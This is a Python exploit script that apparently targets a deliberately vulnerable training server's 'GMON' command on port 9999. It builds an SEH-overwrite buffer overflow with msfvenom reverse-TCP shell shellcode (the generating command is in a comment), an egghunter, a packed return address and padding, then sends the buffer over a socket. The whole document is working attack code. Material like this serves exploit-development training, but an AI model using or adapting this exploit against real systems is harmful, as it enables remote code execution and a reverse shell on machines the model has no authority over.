#!/usr/bin/python
import sys
import socket
import struct
host = "192.168.214.135"
port = 9999
try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #SOCK_STREAM for TCP
except:
        print "socket() failed"
        sys.exit(1)

# msfvenom -p windows/shell/reverse_tcp LHOST= -e x86/alpha_mixed -a x86 --platform windows EXITFUNC=seh BufferRegister=EDI -b '\x00\x0a\x0d\x20' -f python

buf =  ""
buf += "\xb8\x83\x49\xae\x7a\x89\xfe\x2b\xc9\xb1\x53\x31\x46"
buf += "\x15\x83\xee\xfc\x03\x46\x11\xe2\x76\xb5\x46\xf8\x78"
buf += "\x46\x97\x9d\xf1\xa3\xa6\x9d\x65\xa7\x99\x2d\xee\xe5"
buf += "\x15\xc5\xa2\x1d\xad\xab\x6a\x11\x06\x01\x4c\x1c\x97"
buf += "\x3a\xac\x3f\x1b\x41\xe0\x9f\x22\x8a\xf5\xde\x63\xf7"
buf += "\xf7\xb3\x3c\x73\xa5\x23\x48\xc9\x75\xcf\x02\xdf\xfd"
buf += "\x2c\xd2\xde\x2c\xe3\x68\xb9\xee\x05\xbc\xb1\xa7\x1d"
buf += "\xa1\xfc\x7e\x95\x11\x8a\x81\x7f\x68\x73\x2d\xbe\x44"
buf += "\x86\x2c\x86\x63\x79\x5b\xfe\x97\x04\x5b\xc5\xea\xd2"
buf += "\xee\xde\x4d\x90\x48\x3b\x6f\x75\x0e\xc8\x63\x32\x45"
buf += "\x96\x67\xc5\x8a\xac\x9c\x4e\x2d\x63\x15\x14\x09\xa7"
buf += "\x7d\xce\x30\xfe\xdb\xa1\x4d\xe0\x83\x1e\xeb\x6a\x29"
buf += "\x4a\x86\x30\x26\xbf\xaa\xca\xb6\xd7\xbd\xb9\x84\x78"
buf += "\x15\x56\xa5\xf1\xb3\xa1\xbc\x16\x44\x7d\x06\x76\xbb"
buf += "\x7e\x77\x5e\x7f\x2a\x27\xc8\x56\x53\xac\x08\x57\x86"
buf += "\x59\x03\xcf\xe9\x36\xc5\xdc\x82\x44\xea\xf3\x0e\xc0"
buf += "\x0c\xa3\xfe\x82\x80\x03\xaf\x62\x71\xeb\xa5\x6c\xae"
buf += "\x0b\xc6\xa6\xc7\xa1\x29\x1f\xbf\x5d\xd3\x3a\x4b\xfc"
buf += "\x1c\x91\x31\x3e\x96\x10\xc5\xf0\x5f\x50\xd5\xe4\x07"
buf += "\x9a\x25\xf4\xad\x9a\x4f\xf0\x67\xcc\xe7\xfa\x5e\x3a"
buf += "\xa8\x05\xb5\x38\xaf\xf9\x48\x09\xdb\xcf\xde\x35\xb3"
buf += "\x2f\x0f\xb6\x43\x79\x45\xb6\x2b\xdd\x3d\xe5\x4e\x22"
buf += "\xe8\x99\xc2\xb6\x13\xc8\xb7\x11\x7c\xf6\xee\x55\x23"
buf += "\x09\xc5\xe6\x24\xf5\x9b\xc0\x8c\x9e\x63\x50\x2d\x5f"
buf += "\x0e\x50\x7d\x37\xc5\x7f\x72\xf7\x26\xaa\xdb\x9f\xad"
buf += "\x3a\xa9\x3e\xb1\x17\x6f\x9f\xb2\x9b\xb4\x10\xc8\xd3"
buf += "\x4b\xd1\x2d\xfa\x2f\xd1\x2d\x03\x4e\xed\xfb\x3d\x24"
buf += "\x30\x38"

nseh_offset = 3499 - 4
seh_offset = 3499
total_buffer = 5000
jump = 121

egg = "T00WT00W"
egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

junk1 = egg + buf + ("\x41" *  (nseh_offset - jump - len(buf) - len(egg))) + egghunter + ("\x41" * (jump - len(egghunter)))
nseh = "\x71\x85\x70\x83"
# seh = "\x43" * 4
seh = struct.pack("<L",0x6250172b)
junk2 = "\x44" * (total_buffer - nseh_offset - len(nseh) - len(seh))

junk = junk1 + nseh + seh + junk2

#cmd = "GMON /.:/"
cmd = "GMON /r/n"
payload  = cmd + junk
s.connect((host, port))
s.send(payload)